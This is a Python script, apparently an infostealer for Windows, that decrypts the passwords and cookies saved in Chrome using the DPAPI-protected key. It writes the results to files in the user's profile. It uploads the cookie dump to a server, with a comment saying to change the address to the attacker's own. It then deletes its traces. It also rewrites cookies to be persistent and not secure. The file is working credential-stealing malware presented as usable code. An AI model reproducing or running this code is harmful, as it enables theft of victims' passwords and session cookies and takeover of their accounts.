from datetime import timezone, datetime, timedelta
from fileinput import filename
from Crypto.Cipher import AES
from http import cookiejar
from urllib import request
from time import sleep
import win32crypt
import requests
import sqlite3
import random
import shutil
import base64
import json
import os


def get_chrome_datetime(chromedate):
    """Return a `datetime.datetime` object from a chrome format datetime
    Since `chromedate` is formatted as the number of microseconds since January, 1601"""
    return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)


def get_encryption_key():
    local_state_path = os.path.join(os.environ["USERPROFILE"],
                                    "AppData", "Local", "Google", "Chrome",
                                    "User Data", "Local State")
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = f.read()
        local_state = json.loads(local_state)

    # decode the encryption key from Base64
    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    # remove DPAPI str
    key = key[5:]
    # return decrypted key that was originally encrypted
    # using a session key derived from current user's logon credentials
    # doc: http://timgolden.me.uk/pywin32-docs/win32crypt.html
    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]


def decrypt_password(password, key):
    try:
        # get the initialization vector
        iv = password[3:15]
        password = password[15:]
        # generate cipher
        cipher = AES.new(key, AES.MODE_GCM, iv)
        # decrypt password
        return cipher.decrypt(password)[:-16].decode()
    except:
        try:
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except:
            # not supported
            return ""


def main():
    x = os.path.join(os.environ["USERPROFILE"])
    # get the AES key
    key = get_encryption_key()
    # local sqlite Chrome database path
    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                           "Google", "Chrome", "User Data", "default", "Login Data")
    # copy the file to another location
    # as the database will be locked if chrome is currently running
    #filename = "ChromeData.db"
    filename2 = x + '/' + "ChromeData.db"
    shutil.copyfile(db_path, filename2)
    # connect to the database
    db = sqlite3.connect(filename2)
    cursor = db.cursor()
    user = os.getlogin()
    path = x + '/'+user+'.txt'
    f = open(path, 'w', encoding='UTF-8')
    # `logins` table has the data we need
    cursor.execute(
        "select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
    # iterate over all rows
    for row in cursor.fetchall():
        origin_url = row[0]
        action_url = row[1]
        username = row[2]
        password = decrypt_password(row[3], key)
        date_created = row[4]
        date_last_used = row[5]

        if username or password:
            print(f"Origin URL: {origin_url}", file=f)
            print(f"Action URL: {action_url}", file=f)
            print(f"Username: {username}", file=f)
            print(f"Password: {password}", file=f)
        else:
            continue
        if date_created != 86400000000 and date_created:
            print(
                f"Creation date: {str(get_chrome_datetime(date_created))}", file=f)
        if date_last_used != 86400000000 and date_last_used:
            print(
                f"Last Used: {str(get_chrome_datetime(date_last_used))}", file=f)
        print("="*50, file=f)
    # f.close()
    cursor.close()
    db.close()
    os.remove(x + '/' + "ChromeData.db")

    # 宣告一個CookieJar物件例項來儲存cookie
    cookie = cookiejar.CookieJar()
    # 利用urllib.request庫的HTTPCookieProcessor物件來建立cookie處理器,也就CookieHandler
    handler = request.HTTPCookieProcessor(cookie)
    # 通過CookieHandler建立opener
    opener = request.build_opener(handler)
    # 此處的open方法開啟網頁
    response = opener.open('http://www.google.com')
    # 列印cookie資訊
    for item in cookie:
        print('Name = %s' % item.name, file=f)
        print('Value = %s' % item.value, file=f)

    f.close()

    files = {'file': open(x + '/'+user+'.txt', 'rb')}
    #r = requests.post( 'upload_page_url, files=files)


def decrypt_data(data, key):
    try:
        # get the initialization vector
        iv = data[3:15]
        data = data[15:]
        # generate cipher
        cipher = AES.new(key, AES.MODE_GCM, iv)
        # decrypt password
        return cipher.decrypt(data)[:-16].decode()
    except:
        try:
            return str(win32crypt.CryptUnprotectData(data, None, None, None, 0)[1])
        except:
            # not supported
            return ""


def cookie():
    # local sqlite Chrome cookie database path
    user = os.getlogin()
    path = x + '/'+user+'Cookie.txt'
    f = open(path, 'w', encoding='UTF-8')

    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                           "Google", "Chrome", "User Data", "Default", "Network", "Cookies")
    # copy the file to current directory
    # as the database will be locked if chrome is currently open
    #filename = "Cookies.db"
    filename2 = x + '/' + "Cookies.db"
    if not os.path.isfile(filename2):
        # copy file when does not exist in the current directory
        shutil.copyfile(db_path, filename2)
    # connect to the database
    db = sqlite3.connect(filename2)
    # ignore decoding errors
    db.text_factory = lambda b: b.decode(errors="ignore")
    cursor = db.cursor()
    # get the cookies from `cookies` table
    cursor.execute("""
    SELECT host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value 
    FROM cookies""")
    # you can also search by domain, e.g thepythoncode.com
    # cursor.execute("""
    # SELECT host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value
    # FROM cookies
    # WHERE host_key like '%thepythoncode.com%'""")
    # get the AES key
    key = get_encryption_key()
    for host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value in cursor.fetchall():
        if not value:
            decrypted_value = decrypt_data(encrypted_value, key)
        else:
            # already decrypted
            decrypted_value = value
        print(f"""
        Host: {host_key}
        Cookie name: {name}
        Cookie value (decrypted): {decrypted_value}
        Creation datetime (UTC): {get_chrome_datetime(creation_utc)}
        Last access datetime (UTC): {get_chrome_datetime(last_access_utc)}
        Expires datetime (UTC): {get_chrome_datetime(expires_utc)}
        ===============================================================""", file=f)
        # update the cookies table with the decrypted value
        # and make session cookie persistent
        cursor.execute("""
        UPDATE cookies SET value = ?, has_expires = 1, expires_utc = 99999999999999999, is_persistent = 1, is_secure = 0
        WHERE host_key = ?
        AND name = ?""", (decrypted_value, host_key, name))
    # commit changes
    db.commit()
    # close connection
    db.close()
    os.remove(x + '/' + "Cookies.db")

    files = {'file': open(x + '/'+user+'Cookie.txt', 'rb')}
    r = requests.post('http://127.0.0.1/upload.php', files=files) # change the ip to your server ip


x = os.path.join(os.environ["USERPROFILE"])

if __name__ == "__main__":
    main()
    cookie()
    user = os.getlogin()
    os.remove(x + '/' + user + '.txt')
    os.remove(x + '/' + user + 'Cookie.txt')

